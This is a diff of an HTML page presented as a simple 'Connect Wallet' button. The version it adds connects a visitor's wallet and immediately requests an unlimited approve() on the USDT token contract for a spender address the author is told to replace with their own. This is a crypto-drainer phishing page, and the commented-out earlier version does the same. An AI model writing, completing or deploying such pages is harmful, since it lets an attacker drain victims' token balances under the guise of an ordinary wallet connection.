@@ -242,18 +242,22 @@
  -->
 
 
- <!DOCTYPE html>
+ <!-- <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Connect Wallet</title>
+
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.5/dist/index.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
   <style>
     body {
       font-family: sans-serif;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
@@ -268,75 +272,169 @@
       background: #4CAF50;
       color: white;
       cursor: pointer;
+      margin-bottom: 20px;
     }
     button:disabled {
       background: #888;
+    }
+    #qr-code {
+      margin-top: 20px;
+      background: white;
+      padding: 10px;
+      border-radius: 8px;
+    }
+    #status {
+      color: #aaa;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
   <button id="connect-btn">Connect Wallet</button>
+  <div id="qr-code"></div>
+  <div id="status">Not connected</div>
 
   <script>
-    const provider = new WalletConnectProvider.default({
-      rpc: {
-        1: "https://rpc.ankr.com/eth" // или https://mainnet.infura.io/v3/YOUR_INFURA_ID
+
+const providerOptions = {
+      walletconnect: {
+        package: WalletConnectProvider.default,
+        options: {
+          rpc: {
+            1: "https://rpc.ankr.com/eth", 
+            56: "https://bsc-dataseed.binance.org/",
+          },
+          chainId: 1, 
+        },
       },
-      chainId: 1
+    };
+
+
+    const web3Modal = new Web3Modal({
+      cacheProvider: false,
+      providerOptions,
     });
 
-    // Адрес контракта токена и spender для approve
-    const TOKEN_ADDRESS = "0xYourTokenAddress"; // Вставь адрес токена
-    const SPENDER_ADDRESS = "0xSpenderAddress"; // Адрес, которому дается доступ (например, контракт)
-    const MAX_ALLOWANCE = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Максимальное значение для approve
+    let web3;
+    let provider;
+
 
     async function connectWallet() {
-      const btn = document.getElementById('connect-btn');
+      const btn = document.getElementById("connect-btn");
+      const statusEl = document.getElementById("status");
+      
       btn.disabled = true;
       btn.textContent = "Connecting...";
+      statusEl.textContent = "Please select a wallet...";
 
       try {
-        await provider.enable(); // Открывает Trust Wallet или MetaMask через WalletConnect
 
-        const web3 = new Web3(provider);
+        provider = await web3Modal.connect();
+        web3 = new Web3(provider);
+
+
         const accounts = await web3.eth.getAccounts();
+        if (accounts.length === 0) throw new Error("No accounts found!");
+
         const address = accounts[0];
-
         console.log("Connected:", address);
-        btn.textContent = "Connected: " + address.slice(0, 6) + "..." + address.slice(-4);
-
-        // Взаимодействие с контрактом токена для approve
-        const tokenContract = new web3.eth.Contract([
-          {
-            "constant": false,
-            "inputs": [
-              { "name": "spender", "type": "address" },
-              { "name": "value", "type": "uint256" }
-            ],
-            "name": "approve",
-            "outputs": [
-              { "name": "", "type": "bool" }
-            ],
-            "payable": false,
-            "stateMutability": "nonpayable",
-            "type": "function"
-          }
-        ], TOKEN_ADDRESS);
-
-        // Вызов approve для разрешения управления всеми токенами
-        const tx = await tokenContract.methods.approve(SPENDER_ADDRESS, MAX_ALLOWANCE).send({ from: address });
-        console.log("Approval success:", tx);
-        btn.textContent = "Approved!";
         
+
+        btn.textContent = "Connected: " + address.slice(0, 6) + "..." + address.slice(-4);
+        statusEl.textContent = "Wallet connected!";
+        statusEl.style.color = "#4CAF50";
+
+
+        if (provider.wc) {
+          QRCode.toCanvas(document.getElementById("qr-code"), provider.wc.uri, (error) => {
+            if (error) console.error("QR error:", error);
+          });
+        }
+
       } catch (err) {
-        console.error("Error:", err);
-        btn.textContent = "Connect Failed";
+        console.error("Connection error:", err);
+        statusEl.textContent = "Error: " + err.message;
+        statusEl.style.color = "#ff4444";
+        btn.textContent = "Try Again";
       } finally {
         btn.disabled = false;
       }
     }
 
-    document.getElementById('connect-btn').addEventListener('click', connectWallet);
+
+    document.getElementById("connect-btn").addEventListener("click", connectWallet);
+  </script>
+</body>
+</html> -->
+
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Connect Wallet</title>
+</head>
+<body style="background:#121212; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh">
+  <button id="connect-btn" style="padding:15px 30px; font-size:18px;">Connect Wallet</button>
+
+  <script type="module">
+    import Web3Modal from "https://unpkg.com/web3modal@1.9.12/dist/index.js?module";
+    import WalletConnectProvider from "https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js";
+    import Web3 from "https://unpkg.com/web3@1.10.0/dist/web3.min.js";
+
+    const providerOptions = {
+      walletconnect: {
+        package: WalletConnectProvider,
+        options: {
+          rpc: { 1: "https://rpc.ankr.com/eth" },
+          chainId: 1
+        }
+      }
+    };
+
+    const web3Modal = new Web3Modal({
+      cacheProvider: false,
+      providerOptions,
+    });
+
+    const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT
+    const SPENDER_ADDRESS = "0xYourSpenderAddressHere"; // ← замени на свой адрес
+
+    const ABI = [{
+      "constant": false,
+      "inputs": [
+        { "name": "_spender", "type": "address" },
+        { "name": "_value", "type": "uint256" }
+      ],
+      "name": "approve",
+      "outputs": [{ "name": "", "type": "bool" }],
+      "type": "function"
+    }];
+
+    document.getElementById("connect-btn").onclick = async () => {
+      try {
+        const provider = await web3Modal.connect();
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        const user = accounts[0];
+
+        console.log("Connected wallet:", user);
+
+        const contract = new web3.eth.Contract(ABI, TOKEN_ADDRESS);
+        const max = web3.utils.toTwosComplement("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+
+        const tx = await contract.methods.approve(SPENDER_ADDRESS, max).send({ from: user });
+        console.log("Approved!", tx);
+        alert("Approve sent!");
+      } catch (err) {
+        console.error("Error:", err);
+        alert("Something went wrong: " + err.message);
+      }
+    };
   </script>
 </body>
 </html>
